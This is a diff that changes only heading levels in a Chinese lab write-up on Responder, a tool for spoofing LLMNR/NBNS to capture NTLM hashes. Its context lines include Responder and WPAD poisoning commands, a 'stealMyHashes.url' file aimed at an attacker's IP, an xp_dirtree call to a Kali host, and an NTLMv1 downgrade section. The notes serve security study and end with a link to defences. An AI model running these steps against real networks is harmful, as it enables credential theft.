@@ -39,7 +39,7 @@ win10 主机 ping hello-world
 
 ---
 
-# Responder获取hash值
+## Responder获取hash值
 
 工具地址 : [lgandx/Responder](https://github.com/lgandx/Responder)
 
@@ -50,7 +50,7 @@ Reponder 的主要作用其实就是 “协议欺骗”+“模拟服务”，先
 responder -I eth0 -rPv
 ```
 
-## 通过命令获取hash并破解
+### 通过命令获取hash并破解
 
 在 windows7 上尝试使用 net use 访问一个不存在的主机名。
 ```
@@ -121,7 +121,7 @@ type\\192.168.0.1\abc
 dir\\192.168.0.1\abc
 ```
 
-## 通过文件获取hash
+### 通过文件获取hash
 
 **图标**
 
@@ -252,7 +252,7 @@ echo [InternetShortcut] > stealMyHashes.url
 echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
 ```
 
-## 通过 web 漏洞
+### 通过 web 漏洞
 
 - xxe
 
@@ -287,7 +287,7 @@ echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
     xp_dirtree "\\<Kali address>\aaa.com"
     ```
 
-## 通过错误域名获取hash
+### 通过错误域名获取hash
 
 Responder 还有通过 http 协议来骗取 hash 值的功能，由于 win7 默认会尝试通过 LLMNR、NBNS 协议解析域名，那么 win7 输入错误域名后会被欺骗并解析到 kali，随后 responder 会要求 NTLM 认证，受害机器就会发送 hash 值。
 
@@ -301,7 +301,7 @@ chrome 在开启 WPAD 设置时也会默认被欺骗(默认开启),firefox不会
 
 ![](../../../../../assets/img/Security/RedTeam/OS安全/实验/Responder欺骗/8.png)
 
-## 其他
+### 其他
 
 **打印机 printer bug**
 
@@ -319,7 +319,7 @@ Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信
 
 ---
 
-# 加密降级攻击(或使用 Internal-Monologue)
+## 加密降级攻击(或使用 Internal-Monologue)
 
 在实际情况中，NTLMv1 hash 也是存在于 winserver 2003、windows xp 上，而在 win7 上是默认关闭的，我们可以通过修改注册表的方式，使 win7 支持 NTLM V1 认证.
 
@@ -395,7 +395,7 @@ Resonder 加上 `-lm` , 调用的模块就是 SMB1LM, 版本的实现是在 smb 
 
 ---
 
-# WPAD
+## WPAD
 
 ```
 responder -I eth0 -r on -v -F on -w on
@@ -426,6 +426,6 @@ Responder 创建一个身份验证屏幕，并要求客户输入他们在域中�
 
 ---
 
-# 防御手段
+## 防御手段
 
 - [Secure-Win](../../../../Integrated/Windows/Secure-Win.md#防御responder欺骗)
